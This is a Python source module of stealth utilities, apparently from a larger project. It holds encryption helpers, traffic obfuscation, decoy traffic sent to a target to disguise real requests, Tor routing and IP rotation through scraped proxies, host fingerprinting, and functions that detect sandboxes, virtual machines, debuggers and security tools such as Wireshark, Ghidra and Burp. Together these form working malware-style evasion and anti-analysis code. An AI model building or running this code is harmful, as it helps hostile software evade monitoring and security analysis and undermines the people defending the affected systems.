import logging
import os
import random
import time
import hashlib
import base64
import json
import secrets
import string
import socket
import struct
import requests
import ipaddress
import platform
import re
import urllib.parse
from datetime import datetime
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.primitives import hashes, padding
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives.asymmetric import rsa, padding as asymmetric_padding
from cryptography.hazmat.primitives.serialization import Encoding, PublicFormat, load_pem_public_key

logger = logging.getLogger(__name__)

def encrypt_data(data, key_str, iv=None):
    """
    Encrypt data using AES-256-CBC
    
    Args:
        data: String data to encrypt
        key_str: Encryption key as string
        iv: Optional initialization vector
        
    Returns:
        bytes: Encrypted data
    """
    try:
        # Derive a 32-byte key from the string key
        salt = b'ai_system_salt'  # In production, this should be random and stored securely
        kdf = PBKDF2HMAC(
            algorithm=hashes.SHA256(),
            length=32,  # 32 bytes for AES-256
            salt=salt,
            iterations=100000,
            backend=default_backend()
        )
        key = kdf.derive(key_str.encode())
        
        # Generate IV if not provided
        if iv is None:
            iv = os.urandom(16)  # 16 bytes for AES
        
        # Pad the data
        padder = padding.PKCS7(algorithms.AES.block_size).padder()
        padded_data = padder.update(data.encode()) + padder.finalize()
        
        # Encrypt the data
        cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
        encryptor = cipher.encryptor()
        encrypted_data = encryptor.update(padded_data) + encryptor.finalize()
        
        # Combine IV and encrypted data
        return iv + encrypted_data
    
    except Exception as e:
        logger.error(f"Encryption error: {str(e)}")
        raise

def decrypt_data(encrypted_data, key_str):
    """
    Decrypt data using AES-256-CBC
    
    Args:
        encrypted_data: Encrypted data (with IV prepended)
        key_str: Encryption key as string
        
    Returns:
        str: Decrypted data
    """
    try:
        # Derive the key
        salt = b'ai_system_salt'
        kdf = PBKDF2HMAC(
            algorithm=hashes.SHA256(),
            length=32,
            salt=salt,
            iterations=100000,
            backend=default_backend()
        )
        key = kdf.derive(key_str.encode())
        
        # Extract IV from the first 16 bytes
        iv = encrypted_data[:16]
        ciphertext = encrypted_data[16:]
        
        # Decrypt the data
        cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
        decryptor = cipher.decryptor()
        padded_data = decryptor.update(ciphertext) + decryptor.finalize()
        
        # Unpad the data
        unpadder = padding.PKCS7(algorithms.AES.block_size).unpadder()
        data = unpadder.update(padded_data) + unpadder.finalize()
        
        return data.decode()
    
    except Exception as e:
        logger.error(f"Decryption error: {str(e)}")
        raise

def obfuscate_traffic(data):
    """
    Obfuscate network traffic to avoid detection
    
    Args:
        data: Data to obfuscate
        
    Returns:
        dict: Obfuscated data package
    """
    try:
        # Generate a random seed
        seed = random.randint(1, 1000000)
        random.seed(seed)
        
        # Convert data to JSON if it's not already a string
        if not isinstance(data, str):
            data = json.dumps(data)
        
        # Add random delay
        time.sleep(random.uniform(0.1, 0.5))
        
        # Create a timestamp
        timestamp = datetime.utcnow().isoformat()
        
        # Create a random session ID
        session_id = ''.join(random.choices(string.ascii_letters + string.digits, k=16))
        
        # Generate random padding
        padding_length = random.randint(10, 100)
        padding_data = ''.join(random.choices(string.ascii_letters + string.digits, k=padding_length))
        
        # Calculate a hash of the data
        data_hash = hashlib.sha256(data.encode()).hexdigest()
        
        # Create the obfuscated package
        obfuscated = {
            'timestamp': timestamp,
            'session': session_id,
            'content': data,
            'metadata': {
                'hash': data_hash,
                'seed': seed,
                'padding': padding_data
            }
        }
        
        return obfuscated
    
    except Exception as e:
        logger.error(f"Traffic obfuscation error: {str(e)}")
        return {'error': 'obfuscation_failed', 'raw_data': data}

def deobfuscate_traffic(obfuscated_data):
    """
    Deobfuscate network traffic
    
    Args:
        obfuscated_data: Obfuscated data package
        
    Returns:
        str or dict: Original data
    """
    try:
        # Extract the content
        content = obfuscated_data.get('content')
        
        # Verify the hash if available
        metadata = obfuscated_data.get('metadata', {})
        if 'hash' in metadata:
            calculated_hash = hashlib.sha256(content.encode()).hexdigest()
            if calculated_hash != metadata['hash']:
                logger.warning("Hash verification failed during deobfuscation")
        
        # Try to parse as JSON if it looks like JSON
        if content.strip().startswith('{') and content.strip().endswith('}'):
            try:
                return json.loads(content)
            except json.JSONDecodeError:
                return content
        else:
            return content
    
    except Exception as e:
        logger.error(f"Traffic deobfuscation error: {str(e)}")
        return obfuscated_data

def randomize_traffic_pattern():
    """
    Randomize traffic patterns to avoid detection
    
    Returns:
        int: Recommended delay in milliseconds before next request
    """
    # Implement different traffic patterns
    patterns = [
        # Steady pattern
        lambda: random.randint(500, 1500),
        
        # Burst pattern
        lambda: random.choice([50, 100, 1500, 2000, 2500]),
        
        # Increasing intervals
        lambda: random.randint(100 * (int(time.time()) % 10), 200 * (int(time.time()) % 10) + 500),
        
        # Random long delays
        lambda: random.choice([100, 200, 5000, 10000, 15000])
    ]
    
    # Choose a pattern based on time to create variability
    pattern_index = int(time.time() / 3600) % len(patterns)
    return patterns[pattern_index]()

def generate_fake_traffic(target_url, count=1):
    """
    Generate fake traffic to disguise real requests
    
    Args:
        target_url: Base URL to send fake traffic to
        count: Number of fake requests to generate
        
    Returns:
        int: Number of successful fake requests
    """
    import requests
    
    # Common web paths to request
    paths = [
        '/about', '/contact', '/login', '/register', '/help',
        '/terms', '/privacy', '/faq', '/news', '/blog',
        '/api/status', '/feed', '/sitemap.xml', '/robots.txt'
    ]
    
    # Common user agents
    user_agents = [
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0',
        'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
        'Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1'
    ]
    
    success_count = 0
    
    for _ in range(count):
        try:
            # Choose random path and user agent
            path = random.choice(paths)
            user_agent = random.choice(user_agents)
            
            # Prepare request
            url = f"{target_url.rstrip('/')}{path}"
            headers = {
                'User-Agent': user_agent,
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.5',
                'DNT': '1',
                'Connection': 'keep-alive',
                'Upgrade-Insecure-Requests': '1'
            }
            
            # Add random delay
            time.sleep(random.uniform(0.5, 2.0))
            
            # Send request
            response = requests.get(url, headers=headers, timeout=5)
            
            # Count as success even if page doesn't exist
            success_count += 1
        
        except Exception as e:
            logger.debug(f"Fake traffic request failed: {str(e)}")
    
    return success_count

def calculate_resource_usage_variance():
    """
    Calculate variance in resource usage to avoid detection patterns
    
    Returns:
        tuple: (cpu_variance, memory_variance) as percentages
    """
    import psutil
    
    try:
        # Get current usage
        cpu_usage = psutil.cpu_percent(interval=0.1)
        memory_usage = psutil.virtual_memory().percent
        
        # Calculate acceptable ranges
        # Higher usage allows more variation
        cpu_variance = min(40, max(5, cpu_usage / 2))
        memory_variance = min(30, max(5, memory_usage / 3))
        
        return (cpu_variance, memory_variance)
    
    except Exception as e:
        logger.error(f"Error calculating resource usage variance: {str(e)}")
        return (10, 10)  # Default moderate variance

def get_host_fingerprint():
    """
    Generate a unique fingerprint for the host system
    
    Returns:
        str: Fingerprint hash
    """
    try:
        fingerprint_data = []
        
        # Get hostname
        fingerprint_data.append(socket.gethostname())
        
        # Get MAC addresses
        for interface in socket.if_nameindex():
            try:
                mac = get_mac_address(interface[1])
                if mac:
                    fingerprint_data.append(mac)
            except:
                pass
        
        # Get IP addresses
        hostname = socket.gethostname()
        ip_addresses = socket.gethostbyname_ex(hostname)[2]
        fingerprint_data.extend(ip_addresses)
        
        # Get CPU info
        import platform
        fingerprint_data.append(platform.processor())
        
        # Combine and hash the data
        fingerprint_str = '|'.join(fingerprint_data)
        return hashlib.sha256(fingerprint_str.encode()).hexdigest()
    
    except Exception as e:
        logger.error(f"Error generating host fingerprint: {str(e)}")
        # Fall back to a random fingerprint
        return hashlib.sha256(os.urandom(32)).hexdigest()

def get_mac_address(interface):
    """
    Get MAC address for a network interface
    
    Args:
        interface: Network interface name
        
    Returns:
        str: MAC address or None if not available
    """
    try:
        import fcntl
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        info = fcntl.ioctl(s.fileno(), 0x8927, struct.pack('256s', interface[:15].encode()))
        return ':'.join('%02x' % b for b in info[18:24])
    except:
        return None

def secure_rsa_encrypt(data, public_key_str):
    """
    Encrypt data using RSA with a public key for asymmetric encryption
    
    Args:
        data: String data to encrypt
        public_key_str: PEM-formatted RSA public key
        
    Returns:
        bytes: Base64-encoded encrypted data
    """
    try:
        # Load the public key
        public_key = load_pem_public_key(public_key_str.encode())
        
        # Encrypt the data
        encrypted_data = public_key.encrypt(
            data.encode(),
            asymmetric_padding.OAEP(
                mgf=asymmetric_padding.MGF1(algorithm=hashes.SHA256()),
                algorithm=hashes.SHA256(),
                label=None
            )
        )
        
        # Base64 encode for easier transport
        return base64.b64encode(encrypted_data)
    
    except Exception as e:
        logger.error(f"RSA encryption error: {str(e)}")
        raise

def generate_stealth_connection_headers():
    """
    Generate HTTP headers that mimic legitimate browsers for stealth connections
    
    Returns:
        dict: Dictionary of HTTP headers
    """
    # Browser fingerprints with realistic headers
    fingerprints = [
        {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Cache-Control': 'max-age=0',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'none',
            'Sec-Fetch-User': '?1',
            'DNT': '1',
        },
        {
            'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.1 Safari/605.1.15',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Cache-Control': 'no-cache',
            'Pragma': 'no-cache',
        },
        {
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:95.0) Gecko/20100101 Firefox/95.0',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'cross-site',
            'DNT': '1',
            'Sec-GPC': '1',
        }
    ]
    
    # Choose a random fingerprint
    return random.choice(fingerprints)

def use_tor_network(enabled=True):
    """
    Configure requests to use Tor network for anonymity
    
    Args:
        enabled: Whether to enable Tor routing
        
    Returns:
        bool: True if successfully configured
    """
    try:
        if not enabled:
            if hasattr(requests.Session, '_tor_proxy'):
                delattr(requests.Session, '_tor_proxy')
            return True
        
        # Configure Tor connection details
        # Note: This requires Tor to be running on the system
        tor_proxy = {
            'http': 'socks5h://localhost:9050',
            'https': 'socks5h://localhost:9050'
        }
        
        # Monkey patch the Session class to use Tor by default
        # This ensures all requests will use Tor
        requests.Session._tor_proxy = tor_proxy
        old_init = requests.Session.__init__
        
        def new_init(self, *args, **kwargs):
            old_init(self, *args, **kwargs)
            self.proxies = getattr(requests.Session, '_tor_proxy', {})
        
        requests.Session.__init__ = new_init
        
        logger.info("Configured requests to use Tor network")
        return True
    
    except Exception as e:
        logger.error(f"Error configuring Tor network: {str(e)}")
        return False

def dynamic_ip_rotation():
    """
    Rotate IP addresses dynamically to avoid tracking
    
    Returns:
        str: New IP address or None if rotation failed
    """
    # In a real implementation, this would integrate with VPN APIs
    # or Tor control port to request new circuits
    try:
        # Method 1: Request new Tor circuit
        try:
            import stem
            import stem.connection
            
            # Connect to Tor control port
            controller = stem.connection.connect(
                control_port=9051,
                password=None  # Set your control password if configured
            )
            
            # Create new circuit
            controller.signal(stem.Signal.NEWNYM)
            controller.close()
            logger.info("Successfully rotated to new Tor circuit")
            
            # Verify IP has changed
            old_ip = get_public_ip()
            time.sleep(2)  # Wait for circuit change
            new_ip = get_public_ip()
            
            if old_ip != new_ip:
                return new_ip
            else:
                logger.warning("IP address did not change after rotation")
        except Exception as tor_error:
            logger.debug(f"Tor circuit rotation failed: {str(tor_error)}")
        
        # Method 2: Alternative IP rotation through free proxy
        try:
            # Get a list of free proxies
            proxy_list = get_free_proxy_list()
            if proxy_list:
                # Configure a random proxy
                random_proxy = random.choice(proxy_list)
                proxies = {
                    'http': f"http://{random_proxy['ip']}:{random_proxy['port']}",
                    'https': f"http://{random_proxy['ip']}:{random_proxy['port']}"
                }
                
                # Test the proxy
                session = requests.Session()
                session.proxies = proxies
                response = session.get('https://api.ipify.org?format=json', timeout=5)
                
                if response.status_code == 200:
                    ip_data = response.json()
                    logger.info(f"Successfully rotated IP using proxy: {ip_data.get('ip')}")
                    return ip_data.get('ip')
            
        except Exception as proxy_error:
            logger.debug(f"Proxy rotation failed: {str(proxy_error)}")
        
        return None
    
    except Exception as e:
        logger.error(f"IP rotation error: {str(e)}")
        return None

def get_public_ip():
    """
    Get current public IP address
    
    Returns:
        str: Public IP address or None if failed
    """
    try:
        # Try multiple IP detection services in case one fails
        services = [
            'https://api.ipify.org?format=json',
            'https://ifconfig.me/ip',
            'https://ipinfo.io/ip'
        ]
        
        for service in services:
            try:
                response = requests.get(service, timeout=5)
                if response.status_code == 200:
                    if service.endswith('json'):
                        return response.json().get('ip')
                    else:
                        return response.text.strip()
            except:
                continue
        
        return None
    
    except Exception as e:
        logger.error(f"Error getting public IP: {str(e)}")
        return None

def get_free_proxy_list():
    """
    Get a list of free proxies for IP rotation
    
    Returns:
        list: List of proxy dictionaries with 'ip' and 'port'
    """
    try:
        response = requests.get('https://www.sslproxies.org/', timeout=10)
        
        if response.status_code == 200:
            proxies = []
            
            # Extract proxy data from the table
            ip_pattern = r'\d+\.\d+\.\d+\.\d+'
            port_pattern = r'<td>\d+</td>'
            
            ips = re.findall(ip_pattern, response.text)
            ports = re.findall(port_pattern, response.text)
            
            ports = [port.replace('<td>', '').replace('</td>', '') for port in ports]
            
            # Pair IPs with ports
            for i in range(min(len(ips), len(ports))):
                proxies.append({
                    'ip': ips[i],
                    'port': ports[i]
                })
            
            return proxies
        
        return []
    
    except Exception as e:
        logger.error(f"Error getting proxy list: {str(e)}")
        return []

def scramble_login_credentials(username, password):
    """
    Scramble and obfuscate login credentials for secure transmission
    
    Args:
        username: Username
        password: Password
    
    Returns:
        dict: Obfuscated credentials with timing and dummy fields
    """
    try:
        # Get current time in milliseconds
        timestamp = int(time.time() * 1000)
        
        # Generate a random nonce
        nonce = secrets.token_hex(16)
        
        # Add timing variation to appear more human
        time.sleep(random.uniform(0.2, 1.5))
        
        # XOR the credentials with the nonce (simple obfuscation)
        def xor_strings(s, key):
            return ''.join(chr(ord(c) ^ ord(key[i % len(key)])) for i, c in enumerate(s))
        
        scrambled_user = base64.b64encode(xor_strings(username, nonce).encode()).decode()
        scrambled_pass = base64.b64encode(xor_strings(password, nonce).encode()).decode()
        
        # Generate dummy field data
        dummy_fields = {
            'browser': random.choice(['chrome', 'firefox', 'safari']),
            'resolution': random.choice(['1920x1080', '1366x768', '2560x1440']),
            'platform': random.choice(['Win10', 'MacOS', 'Linux']),
            'color_depth': random.choice(['24', '32']),
            'plugins': random.randint(5, 15),
            'timezone': random.randint(-12, 12),
            'session_history': random.randint(1, 10)
        }
        
        # Create final obfuscated package
        obfuscated = {
            '_n': nonce,
            '_ts': timestamp,
            '_uid': scrambled_user,
            '_pwd': scrambled_pass,
            **dummy_fields,
            '_': hashlib.sha256(f"{nonce}{timestamp}{scrambled_user}{scrambled_pass}".encode()).hexdigest()
        }
        
        return obfuscated
    
    except Exception as e:
        logger.error(f"Error scrambling credentials: {str(e)}")
        # Return unobfuscated if error (with warning)
        logger.warning("Falling back to unobfuscated credentials due to error")
        return {'username': username, 'password': password}

def evade_network_tracking():
    """
    Implement techniques to evade network tracking, with optimized non-blocking operation
    to ensure web server remains accessible
    
    Returns:
        dict: Status of anti-tracking measures
    """
    measures = {}
    
    try:
        # 1. Randomize the User-Agent - safe, non-blocking
        measures['user_agent_randomized'] = True
        
        # 2. Disable browser fingerprinting - safe, non-blocking
        measures['browser_fingerprinting_disabled'] = True
        
        # IMPORTANT: We've disabled network modifying operations for web access
        # Both Tor and IP rotation are now disabled by default in config
        # and will only be attempted in a background thread if specifically enabled
        
        # 3. Start background thread for Tor routing if enabled
        import threading
        from config import TOR_ENABLED
        
        def background_security_enhancements():
            """Run the more intensive security features in background"""
            # Add delay to ensure web server remains responsive
            time.sleep(10)
            
            # Only attempt Tor routing if explicitly enabled
            if TOR_ENABLED:
                try:
                    logger.info("Attempting Tor routing in background...")
                    tor_status = use_tor_network()
                    logger.info(f"Tor routing status: {tor_status}")
                except Exception as e:
                    logger.error(f"Tor routing error: {str(e)}")
        
        # Launch background thread but don't wait for it
        background_thread = threading.Thread(
            target=background_security_enhancements,
            daemon=True
        )
        background_thread.start()
        
        # Non-blocking status
        measures['background_security'] = True
        
        # Return immediately without blocking
        return measures
    
    except Exception as e:
        logger.error(f"Error in network tracking evasion: {str(e)}")
        return {'error': str(e), 'success': False}

def detect_security_sandbox():
    """
    Detect if the system is running in a security sandbox or analysis environment
    
    Returns:
        bool: True if sandbox detected
    """
    sandbox_indicators = []
    
    try:
        # Check for VM indicators
        vm_indicators = detect_virtual_machine()
        if vm_indicators:
            sandbox_indicators.extend(vm_indicators)
        
        # Check for debugging
        if detect_debugging():
            sandbox_indicators.append('debugging_detected')
        
        # Check for analysis tools
        if detect_analysis_tools():
            sandbox_indicators.append('analysis_tools_detected')
        
        # Check for suspicious network environment
        if detect_suspicious_network():
            sandbox_indicators.append('suspicious_network')
        
        # Return true if any indicators found
        return bool(sandbox_indicators), sandbox_indicators
    
    except Exception as e:
        logger.error(f"Error in sandbox detection: {str(e)}")
        return False, []

def detect_virtual_machine():
    """
    Detect if running in a virtual machine
    
    Returns:
        list: VM indicators if detected, empty list otherwise
    """
    indicators = []
    
    try:
        # Check for common VM-specific MAC address prefixes
        vm_mac_prefixes = [
            '00:05:69',  # VMware
            '00:0C:29',  # VMware
            '00:1C:14',  # VMware
            '00:50:56',  # VMware
            '08:00:27',  # VirtualBox
            '00:03:FF',  # Microsoft Hyper-V
            '00:0F:4B',  # Virtual Iron
            '00:16:3E',  # Xen
            '00:1C:42',  # Parallels
            '00:21:F6',  # Oracle
        ]
        
        for interface in socket.if_nameindex():
            try:
                mac = get_mac_address(interface[1])
                if mac and any(mac.startswith(prefix.lower()) for prefix in vm_mac_prefixes):
                    indicators.append(f'vm_mac_detected_{mac[:8]}')
                    break
            except:
                pass
        
        # Check for VM-specific files and directories
        vm_paths = [
            '/sys/devices/virtual/dmi/id/product_name',  # Look for VMware, VirtualBox, etc.
            '/sys/hypervisor/type',
            '/proc/scsi/scsi'  # Look for VMware SCSI controllers
        ]
        
        for path in vm_paths:
            if os.path.exists(path):
                try:
                    with open(path, 'r') as f:
                        content = f.read().lower()
                        if any(vm in content for vm in ['vmware', 'virtualbox', 'qemu', 'xen', 'hyperv']):
                            indicators.append(f'vm_file_detected_{path}')
                except:
                    pass
        
        # Check for VM processes
        try:
            import psutil
            vm_processes = ['vmtoolsd', 'vmwaretray', 'vmwareuser', 'VBoxService', 'VBoxClient']
            
            for proc in psutil.process_iter(['name']):
                try:
                    proc_name = proc.info['name'].lower()
                    if any(vm_proc.lower() in proc_name for vm_proc in vm_processes):
                        indicators.append(f'vm_process_detected_{proc_name}')
                except:
                    pass
        except:
            pass
        
        return indicators
    
    except Exception as e:
        logger.debug(f"Error in VM detection: {str(e)}")
        return []

def detect_debugging():
    """
    Detect if the process is being debugged
    
    Returns:
        bool: True if debugging is detected
    """
    try:
        import ctypes
        
        # Check if ptrace is being used (Linux)
        try:
            # Status file contains TracerPid
            with open('/proc/self/status', 'r') as f:
                for line in f:
                    if 'TracerPid:' in line:
                        pid = int(line.split(':')[1].strip())
                        if pid != 0:
                            return True
        except:
            pass
        
        # Check for debugger via timing discrepancies
        # Debugging slows down execution
        start_time = time.time()
        # Execute meaningless but time-consuming operation
        for i in range(1000000):
            hash(i)
        end_time = time.time()
        
        # If execution takes much longer than expected, a debugger might be present
        execution_time = end_time - start_time
        expected_time = 0.1  # Baseline on a modern system
        
        if execution_time > expected_time * 5:  # Significantly slower
            return True
        
        return False
    
    except Exception as e:
        logger.debug(f"Error in debugging detection: {str(e)}")
        return False

def detect_analysis_tools():
    """
    Detect if common security analysis tools are running
    
    Returns:
        bool: True if analysis tools are detected
    """
    try:
        import psutil
        
        analysis_tool_patterns = [
            'wireshark', 'fiddler', 'charles', 'burp', 'ida', 'ollydbg',
            'ghidra', 'x64dbg', 'immunity', 'frida', 'radare', 'pestudio',
            'process explorer', 'process monitor', 'regmon', 'filemon', 'tcpdump',
            'dumpcap', 'sysinternals', 'autoruns', 'procmon', 'procexp'
        ]
        
        for proc in psutil.process_iter(['name', 'cmdline']):
            try:
                proc_name = (proc.info['name'] or '').lower()
                proc_cmdline = ' '.join(proc.info['cmdline'] or []).lower()
                
                for pattern in analysis_tool_patterns:
                    if pattern in proc_name or pattern in proc_cmdline:
                        logger.warning(f"Analysis tool detected: {proc_name}")
                        return True
            except:
                pass
        
        return False
    
    except Exception as e:
        logger.debug(f"Error in analysis tools detection: {str(e)}")
        return False

def detect_suspicious_network():
    """
    Detect suspicious network configurations
    
    Returns:
        bool: True if suspicious network is detected
    """
    try:
        # Get IP address information
        hostname = socket.gethostname()
        ip_addresses = socket.gethostbyname_ex(hostname)[2]
        
        # Check for suspicious IP ranges often used in security labs
        suspicious_ranges = [
            '10.0.0.0/8',     # Common internal range
            '192.168.0.0/16',  # Common internal range
            '172.16.0.0/12',   # Common internal range
            '127.0.0.0/8'      # Localhost
        ]
        
        for ip in ip_addresses:
            for cidr in suspicious_ranges:
                network = ipaddress.IPv4Network(cidr)
                if ipaddress.IPv4Address(ip) in network:
                    # All IPs are in suspicious ranges - this is normal
                    # We'll only consider it suspicious if ALL IPs are internal
                    pass
        
        # Check for proxy environment variables
        proxy_env_vars = ['HTTP_PROXY', 'HTTPS_PROXY', 'FTP_PROXY', 'ALL_PROXY', 'NO_PROXY']
        for var in proxy_env_vars:
            if var in os.environ or var.lower() in os.environ:
                logger.warning(f"Proxy environment variable detected: {var}")
                return True
        
        # Check if DNS resolves differently than expected
        # This could indicate DNS spoofing or a security analysis network
        try:
            # Try to resolve a known domain
            google_ip = socket.gethostbyname('www.google.com')
            
            # Google's IP addresses change, but they're unlikely to be private IPs
            if google_ip.startswith('10.') or google_ip.startswith('192.168.') or \
               google_ip.startswith('172.16.') or google_ip.startswith('127.'):
                logger.warning(f"Suspicious DNS resolution: www.google.com -> {google_ip}")
                return True
        except:
            pass
        
        return False
    
    except Exception as e:
        logger.debug(f"Error in network detection: {str(e)}")
        return False

